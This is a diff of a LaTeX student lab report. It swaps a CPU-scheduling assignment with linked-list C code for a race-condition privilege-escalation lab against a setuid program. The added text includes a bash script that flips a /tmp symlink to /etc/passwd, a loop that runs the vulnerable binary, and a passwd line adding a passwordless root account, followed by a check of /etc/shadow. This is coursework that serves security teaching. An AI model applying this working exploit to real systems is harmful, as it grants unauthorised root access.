@@ -51,312 +51,106 @@ int main() {
 }
 \end{verbatim}
 
-\section{The Exploit}
-While going through this program, we notice that there is a known issue with the 'access' command.  The concept is that there is a delay between 'access' and 'fopen' that a malicious party can act on.  
+Now that we have our program, there is one more modification we need to make this behave the way we want.  We need to set the sticky bit for the program.
+
+\begin{figure}[H]
+\centering
+\includegraphics[scale=0.5]{./images/ss02.png}
+\caption{File Tweak}
+\label{fig:Code}
+\end{figure}
+
+\section{Explanation}
+While going through this program, we notice that there is a known issue with the 'access' command.  The concept is that there is a delay between 'access' and 'fopen' that a malicious party can act on.  By using file linking, we are able to change the file being referenced to a file that we do not have access.  The goal here to continuously execute the program we have already created, and get race it to this gap in commands using another task.
+
+\section{Exploitation}
+\subsection{Vulnerable Script}
+This section is exactly what was given to us.  It is a bash script that creates a loop to check if we manipulated our intended file.  If we have not, then keep trying.  If we have, then break the loop and proceed to verify the change has been made.
 
 \begin{verbatim}
-void run(Task *task, int slice) {
-    printf("Running task = [%s] [%d] [%d] for %d units.\n",task->name, task->priority, task->burst, slice);
-}
+#!/bin/bash
+CHECK_FILE="ls -l /etc/passwd"
+old=$($CHECK_FILE)
+new=$($CHECK_FILE)
+while [ "$old" == "$new" ]
+do
+./vulp < passwd_input
+new=$($CHECK_FILE)
+done
+echo "STOP... The passwd file has been changed"
 \end{verbatim}
 
-\subsection{insert()}
-Insert ends up being a very important function for creating the list.  This function is the nuts and bolts for how you create the linked list.  It grabs the current location of the list, inserts the new task at the front of it, and shifts the head of the list.
+\subsection{Attacking Script}
+For the attacking script, I veered away from the provided example a bit.  The book was using a C program to create the file links.  Rather than rely on a program that needs to be compiled on a target machine, I used a pure bash technique.
 
 \begin{verbatim}
-void insert(struct node **head, Task *newTask) {
-    // add the new task to the list 
-    struct node *newNode = malloc(sizeof(struct node));
+#!/bin/bash
 
-    newNode->task = newTask;
-    newNode->next = *head;
-    *head = newNode;
-}
+# Setup
+file="/tmp/worthlessFile"
+touch $file
+
+while true; do
+	ln -sf /tmp/worthlessFile /tmp/XYZ
+	sleep .001 
+	ln -sf /etc/passwd /tmp/XYZ
+	sleep .001
+done
+
+# Cleanup
+rm -f $file
 \end{verbatim}
-\subsection{delete()}
-The delete function removes a task from the list.  It does this by tweaking the linking in the list.  If the item is at the start of the list, then it just changes the location of head.  If it is anywhere in the middle, then it finds the previous task and sets its 'next' location to be the item after the deleted task.  This function is intended to be run when a task has fully completed its burst. 
+
+The goal here is to try and force the program to jump to the '/etc/passwd' file.  This file contains all of the users currently on the operating system.
+
+\subsection{Content Injection}
+
+The last step is to decide what content to inject.  Here we are using a known string that will allow us to create a user called 'test' that is the root user with no password.
 
 \begin{verbatim}
-void delete(struct node **head, Task *task) {
-    struct node *temp;
-    struct node *prev;
-
-    temp = *head;
-    // special case - beginning of list
-    if (strcmp(task->name,temp->task->name) == 0) {
-        *head = (*head)->next;
-    }
-    else {
-        // interior or last element in the list
-        prev = *head;
-        temp = temp->next;
-        while (strcmp(task->name,temp->task->name) != 0) {
-            prev = temp;
-            temp = temp->next;
-        }
-
-        prev->next = temp->next;
-    }
-}
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
 \end{verbatim}
-
-\subsection{add()}
-The last function provided to us is add().  This function is called from main() and helps setup the task structure that will be required for the insert() function to work properly. 
-
-\begin{verbatim}
-void add(char *name, int priority, int burst) {
-    // first create the new task
-    Task *newTask = (Task *) malloc(sizeof(Task));
-    
-    newTask->name = name;
-    newTask->priority = priority;
-    newTask->burst = burst;
-	
-    // insert the new task into the list of tasks 
-    insert(&head, newTask);
-}
-\end{verbatim}
-\section{Part II: My Code}
-All code written by me is included in the appendices.  This section is here to walk through my thoughts on how to write the code and reference some of the things actually done.  There were two placeholders provided to me in the sample file, schedule() and pickNextTask().
-
-\subsection{schedule()}
-I interpreted this function to be the "How" to run a task.  There are several ways to set this function up, but I opted to utilize recursion.  After talking to another classmate, he explained to me why, in this particular instance, recursion might work, but is not the most optimal way to set this up.  I am able to show that it is capable of working however.  
-
-There are two different paths with my schedule function.  One is used for all programs that run to completion once a task has been chosen.  The other method is for hanlding round robin based scheduling.  The latter ends up being more complicated.
-
-The goal for all schedule functions is to take the selected task, run it for the duration required, and then either update it and place it back in the queue or delete it from the queue once it is done.
-
-\subsection{pickNextTask()}
-This function, in my opinion, was more of the "What" to run.  Every time schedule() runs, it makes a call to pickNextTask().  This function then provides a task to be run.  The goal with this function was to step through the list using a pointer, or two, to make a decision on which task is appropriate depending on the scheduling algorithm desired.
 
 
 \section{Part III: Results}
-This section is very straight forward.  First we compile the correct code, per the make file, and then we execute the desired schedule.  All code executes correctly and the programs gracefully exit.
+We run the two shell scripts:
 
+\begin{figure}[H]
+\centering
+\includegraphics[scale=0.5]{./images/ss05.png}
+\caption{vulnerable.sh}
+\label{fig:Code}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[scale=0.5]{./images/ss04.png}
+\caption{attacker.sh}
+\label{fig:Code}
+\end{figure}
+
+And after a period of time, our race condition comes to completion.
+
+\begin{figure}[H]
+\centering
+\includegraphics[scale=0.5]{./images/ss03.png}
+\caption{completion}
+\label{fig:Code}
+\end{figure}
+
+The only thing left to do is to verify that our new root account exists with no password.
+
+\begin{figure}[H]
+\centering
+\includegraphics[scale=0.5]{./images/ss06.png}
+\caption{File Tweak}
+\label{fig:Code}
+\end{figure}
+
+Here we authenticate to the user 'test' and press enter when presented with a password prompt.  We are granted access and we proceed to check the /etc/shadow file.  A file that by default only root is able to read.  Since we receive no permission failure, it is safe to conclude that the race condition has run successfully and our privilege elevation vulnerability has fully executed.
 
 \section{Conclusion}
-In conclusion, I think this was an interesting programming project.  I would definitely be interested in a project that dives a bit deeper.  I felt that with the examples presented in class it was impossible to not be able to complete the steps needed to program these applications.  The crazy thing to me is how many people in class complained about how this was some third year programming activity.  I did take one basic C course about 15 years ago, and have not touched the language much since.  I also don't develop for a living, but I am familiar with coding and coding concepts, as I think any modern engineer in a computer based field should be.  I think if you asked me to build the entire program instead of just two functions, the complaints might have had some merit, but since we were just filling in the gaps I thought it was pretty simple once I was able to follow the code.
-
-\pagebreak
-\section{Appendix A: FCFS Code}
-\begin{verbatim}
-void schedule() {
-
-    Task *currentTask = pickNextTask();
-
-    if(!currentTask) {
-        exit(0);
-    }
-
-    run(currentTask, currentTask->burst);
-    delete(&head, currentTask);
-    schedule();
-}
-
-Task *pickNextTask() {
-
-    struct node *temp;
-    temp = head;
-
-    if (!temp){
-        printf("Nice job! Teacher, give this student an A.\n");
-        exit(0);
-    }
-    
-    while (temp) {
-        if(!temp->next) {
-            return temp->task;
-        }
-
-        temp = temp->next;
-    }
-
-    return 0;
-}
-\end{verbatim}
-
-\pagebreak
-\section{Appendix B: SJF Code}
-\begin{verbatim}
-void schedule() {
-
-    Task *currentTask = pickNextTask();
-
-    if(!currentTask) {
-        exit(0);
-    }
-
-    run(currentTask, currentTask->burst);
-    delete(&head, currentTask);
-    schedule();
-}
-
-Task *pickNextTask() {
-
-    struct node *temp;
-    temp = head;
-
-    if (!temp){
-        printf("Nice job! Teacher, give this student an A.\n");
-        exit(0);
-    }
-
-    int sjf = temp->task->burst;
-    Task *chosenTask = temp->task;
-
-    while (temp) {
-
-        if(temp->task->burst <= sjf) {
-            sjf = temp->task->burst;
-            chosenTask = temp->task;
-        }
-
-        if(!temp->next) {
-            return chosenTask;
-        }
-
-        temp = temp->next;
-    }
-
-    return 0;
-}
-\end{verbatim}
-
-\pagebreak
-\section{Appendix C: Priority Code}
-\begin{verbatim}
-void schedule() {
-    
-    Task *currentTask = pickNextTask();
-
-    if(currentTask == NULL) {
-        exit(0);
-    }
-
-    run(currentTask, currentTask->burst);
-    delete(&head, currentTask);
-    schedule();
-}
-
-Task *pickNextTask() {
-
-    struct node *temp;
-    temp = head;
-
-    if (!temp){
-        printf("Nice job! Teacher, give this student an A.\n");
-        exit(0);
-    }
- 
-    int pri = temp->task->priority;
-    Task *chosenTask = temp->task;
-
-    while (temp) {
-        if(temp->task->priority >= pri) {
-            pri = temp->task->priority;
-            chosenTask = temp->task;
-        }
-        if(!temp->next) {
-            return chosenTask;
-        }
-        temp = temp->next;
-    }
-    return 0;
-}
-\end{verbatim}
-
-\pagebreak
-\section{Appendix D: Round Robin Code}
-\begin{verbatim}
-void schedule() {
-    
-    Task *currentTask = pickNextTask();
-
-    if(!currentTask) {
-        exit(0);
-    }
-
-    if(currentTask->burst > QUANTUM) {
-        run(currentTask, QUANTUM);
-        currentTask->burst = currentTask->burst - QUANTUM;
-        delete(&head, currentTask);
-        insert(&head, currentTask);
-    } else {
-        run(currentTask, currentTask->burst);
-        delete(&head, currentTask);
-    }
-    schedule();
-}
-
-Task *pickNextTask() {
-
-    struct node *temp;
-    temp = head;
-
-    if (!temp){
-        printf("Nice job! Teacher, give this student an A.\n");
-        exit(0);
-    }
-    
-    while (temp) {
-        if(!temp->next) {
-            return temp->task;
-        }
-        temp = temp->next;
-    }
-
-    return 0;
-}
-\end{verbatim}
-
-\pagebreak
-\section{Appendix E: Priority Round Robin Code}
-\begin{verbatim}
-void schedule() {
-
-    Task *currentTask = pickNextTask();
-    
-    if(!currentTask) {
-        exit(0);
-    }
-    if(currentTask->burst > QUANTUM) {
-        run(currentTask, QUANTUM);
-        currentTask->burst = currentTask->burst - QUANTUM;
-        delete(&head, currentTask);
-        insert(&head, currentTask);
-    } else {
-        run(currentTask, currentTask->burst);
-        delete(&head, currentTask);
-    }
-    schedule();
-}
-
-Task *pickNextTask() {
-    
-    struct node *temp;
-    temp = head;
-
-    if (!temp){
-        printf("Nice job! Teacher, give this student an A.\n");
-        exit(0);
-    }
-
-    int pri = temp->task->priority;
-    Task *chosenTask = temp->task;
-
-    while (temp) {
-        if(temp->task->priority >= pri) {
-            pri = temp->task->priority;
-            chosenTask = temp->task;
-        }
-        if(!temp->next) {
-            return chosenTask;
-        }
-        temp = temp->next;
-    }
-    return 0;
-}
-\end{verbatim}
+In conclusion, I think this was an interesting exploitation project.  I would definitely be interested in a project that dives a bit deeper.  I felt that with the examples presented in class it was impossible to not be able to complete the steps needed to be successful here.  I really, really liked the content thus far for this class, but I feel like it has just flat out been too easy.
 
 \pagebreak
 \begin{thebibliography}{9}
